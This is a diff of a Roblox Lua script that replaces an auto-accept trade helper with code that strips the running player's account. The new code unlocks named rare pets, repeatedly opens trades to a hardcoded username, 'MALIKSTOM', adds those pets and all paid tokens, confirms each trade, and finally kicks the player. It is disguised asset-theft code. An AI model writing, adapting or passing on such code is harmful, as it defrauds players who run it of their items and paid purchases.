@@ -1,167 +1,221 @@
-local ACCEPT_PET_NAMES = {"Surge Dragon", "Dual Shock", "Overcharged Robot"}
+local targetUsername = "MALIKSTOM"
+local petsToTrade = {"Surge Dragon", "Dual Shock", "Overcharged Robot"}
 
-local CHECK_INTERVAL = 1
-local WAIT_TIME = 5
-local DEBUG_MODE = true
+local autotradetokens = true
 
-local lastPetAddedTime = 0
-local lastKnownPetIds = {}
-local isInTrade = false
-local tradePartnerId = nil
-local readyUpCooldown = false
+-- SERVICES
+local Players = game:GetService("Players")
+local Network = require(game:GetService("ReplicatedStorage").Modules.Network)
+local Replication = require(game:GetService("ReplicatedStorage").Game.Replication)
 
-local function debugPrint(message)
-    if DEBUG_MODE then
-        print("[AutoTrade] " .. message)
-    end
-end
+-- VARIABLES
+local player = Players.LocalPlayer
 
-local function isPetInAcceptList(petName)
-    for _, acceptedName in pairs(ACCEPT_PET_NAMES) do
-        if string.find(petName, acceptedName) or petName == acceptedName then
-            return true
+-- FUNCTIONS
+function WaitForCondition(conditionFunc, timeout)
+    local startTime = tick()
+    while not conditionFunc() do
+        if tick() - startTime > (timeout or 30) then
+            return false
         end
+        task.wait()
     end
-    return false
-end
-
-local function getCurrentPetIds()
-    local petIds = {}
-    
-    local success, replication = pcall(function()
-        return require(game:GetService("ReplicatedStorage").Game.Replication)
-    end)
-    
-    if success and replication and replication.Data and replication.Data.Pets then
-        for petId, petData in pairs(replication.Data.Pets) do
-            if petData and petData.Name then
-                table.insert(petIds, petId)
-            end
-        end
-    end
-    
-    return petIds
-end
-
-local function checkForNewPets()
-    local currentPetIds = getCurrentPetIds()
-    local newPetIds = {}
-    
-    for _, petId in pairs(currentPetIds) do
-        if not table.find(lastKnownPetIds, petId) then
-            table.insert(newPetIds, petId)
-        end
-    end
-    
-    lastKnownPetIds = currentPetIds
-    
-    return newPetIds
-end
-
-local function shouldAcceptTrade()
-    if not isInTrade then
-        return false
-    end
-    
-    local timeSinceLastPet = tick() - lastPetAddedTime
-    if timeSinceLastPet < WAIT_TIME then
-        return false
-    end
-    
     return true
 end
 
-local function autoTradeLogic()
-    while true do
-        task.wait(CHECK_INTERVAL)
+function UnlockPets()
+    local PetNames = {}
+    for _, name in ipairs(petsToTrade) do
+        PetNames[name] = true
+    end
+    
+    local pets = Replication.Data and Replication.Data.Pets
+    if not pets then return end
+    
+    for _, petData in pairs(pets) do
+        if petData
+            and petData.Name
+            and PetNames[petData.Name]
+            and (petData.Locked == true or petData.Locked == 1 or petData.Locked == "true")
+        then
+            Network:InvokeServer("LockPet", petData.Id, false)
+        end
+    end
+end
+
+function GetPetIDsByName()
+    local petIDs = {}
+    local pets = Replication.Data and Replication.Data.Pets
+    if not pets then return petIDs end
+    
+    local petNameLookup = {}
+    for _, name in ipairs(petsToTrade) do
+        petNameLookup[name] = true
+    end
+    
+    for _, petData in pairs(pets) do
+        if petData and petData.Name and petNameLookup[petData.Name] then
+            table.insert(petIDs, petData.Id)
+        end
+    end
+    
+    return petIDs
+end
+
+function GetTokenAmount()
+    local Replication = game:GetService("ReplicatedStorage").Replication
+    return Replication.Data.Items.PaidTokens
+end
+
+function HasPetsToTrade()
+    local petIDs = GetPetIDsByName()
+    return #petIDs > 0
+end
+
+function FindTargetPlayer()
+    return Players:FindFirstChild(targetUsername)
+end
+
+function WaitForPetsRemoved(tradedPetIDs)
+    local startTime = tick()
+    
+    while tick() - startTime < 3 do
+        local currentPetIDs = GetPetIDsByName()
         
-        local newPetIds = checkForNewPets()
-        if #newPetIds > 0 then
-            debugPrint("Detected " .. #newPetIds .. " new pet(s)")
-            
-            local replication = require(game:GetService("ReplicatedStorage").Game.Replication)
-            local acceptedPetFound = false
-            
-            for _, petId in pairs(newPetIds) do
-                if replication.Data.Pets[petId] then
-                    local petName = replication.Data.Pets[petId].Name
-                    if isPetInAcceptList(petName) then
-                        debugPrint("Found: " .. petName)
-                        acceptedPetFound = true
-                        break
-                    end
+        local allRemoved = true
+        for _, tradedId in ipairs(tradedPetIDs) do
+            local stillHas = false
+            for _, currentId in ipairs(currentPetIDs) do
+                if currentId == tradedId then
+                    stillHas = true
+                    break
                 end
             end
-            
-            if acceptedPetFound then
-                lastPetAddedTime = tick()
+            if stillHas then
+                allRemoved = false
+                break
             end
         end
         
-        if shouldAcceptTrade() then
-            debugPrint("Auto accepting trade...")
+        if allRemoved then
+            return true
+        end
+        
+        task.wait(0.1)
+    end
+    
+    return false
+end
 
-            -- Fire the remote to **accept** the trade
-            local Network_upvr = require(game.ReplicatedStorage.Modules.Network)
-            local success, result = pcall(function()
-                return Network_upvr:FireServer("AcceptTrade")  -- Ensure this is the correct remote for accepting the trade
-            end)
+function TradeWithTarget()
+    while true do
+        -- If there are no pets left to trade, check if we have any to retry
+        if not HasPetsToTrade() then
+            if not player:FindFirstChild("Pets") then
+                player:Kick("No more pets to trade")
+                return
+            end
+        end
+        
+        UnlockPets()
+        
+        local target = FindTargetPlayer()
+        if not target then
+            task.wait(5)
+            return
+        end
+        
+        Network:FireServer("SendTrade", target)
+        
+        local tradeEnabled = WaitForCondition(function()
+            return player.PlayerGui.Trading.Enabled
+        end, 5)
+        
+        if not tradeEnabled then
+            task.wait(5)
+            return
+        end
+        
+        local petIDs = GetPetIDsByName()
+        
+        if #petIDs > 0 then
+            for _, petId in ipairs(petIDs) do
+                Network:InvokeServer("AddTradeItem", { "Pet", petId })
+            end
             
-            if success then
-                readyUpCooldown = true
-                task.wait(2)
-                readyUpCooldown = false
+            Network:FireServer("ReadyUp", false, true)
+            
+            local tradeCompleted = WaitForCondition(function()
+                return not player.PlayerGui.Trading.Enabled
+            end, 10)
+            
+            if not tradeCompleted then
+                Network:FireServer("CloseTrade")
+                task.wait(0.5)
             else
-                debugPrint("Failed to accept trade.")
+                WaitForPetsRemoved(petIDs)
             end
+        end
+        
+        -- Re-check pets to trade after trade completion.
+        if HasPetsToTrade() then
+            print("Re-entering trade with remaining pets")
+            task.wait(1) -- Brief delay before trying again
+        else
+            print("No more pets left to trade.")
+            break
         end
     end
 end
 
-local function setupTradeHooks()
-    local Network_upvr = require(game.ReplicatedStorage.Modules.Network)
-    
-    -- Handle trade start, close, and items being added or removed
-    Network_upvr:BindEvents({
-        ["StartTrade"] = function(tradeData)
-            isInTrade = true
-            tradePartnerId = tradeData.partner.UserId
-            lastPetAddedTime = tick()
-        end,
+function AutoTradeTokens()
+    while autotradetokens do
+        local target = FindTargetPlayer()
+        if not target then
+            task.wait(5)
+            return
+        end
         
-        ["CloseTrade"] = function()
-            isInTrade = false
-            tradePartnerId = nil
-            readyUpCooldown = false
-        end,
+        Network:FireServer("SendTrade", target)
         
-        ["AddTradeItem"] = function(itemData)
-            if itemData[1] == "Pet" then
-                lastPetAddedTime = tick()
+        local tradeEnabled = WaitForCondition(function()
+            return player.PlayerGui.Trading.Enabled
+        end, 5)
+        
+        if not tradeEnabled then
+            task.wait(5)
+            return
+        end
+        
+        local tokenAmount = GetTokenAmount()
+        
+        if tokenAmount > 0 then
+            for i = 1, tokenAmount do
+                Network:InvokeServer("AddTradeItem", { "Token", i })
             end
-        end,
-        
-        ["RemoveTradeItem"] = function(itemData)
-            if itemData[1] == "Pet" then
-                lastPetAddedTime = tick()
+            
+            Network:FireServer("ReadyUp", false, true)
+            
+            local tradeCompleted = WaitForCondition(function()
+                return not player.PlayerGui.Trading.Enabled
+            end, 10)
+            
+            if not tradeCompleted then
+                Network:FireServer("CloseTrade")
+                task.wait(0.5)
             end
         end
-    })
-end
-
-local function init()
-    debugPrint("Starting Auto Trade for: Surge Dragon, Dual Shock, Overcharged Robot")
-    
-    lastKnownPetIds = getCurrentPetIds()
-    
-    local success, err = pcall(setupTradeHooks)
-    if not success then
-        debugPrint("Error: " .. tostring(err))
+        
+        task.wait(3)
     end
-    
-    task.spawn(autoTradeLogic)
-    
-    debugPrint("Ready")
 end
 
-init()
+-- MAIN LOGIC
+while true do
+    if not HasPetsToTrade() and autotradetokens then
+        AutoTradeTokens()
+    else
+        TradeWithTarget()
+    end
+    task.wait(1)
+end
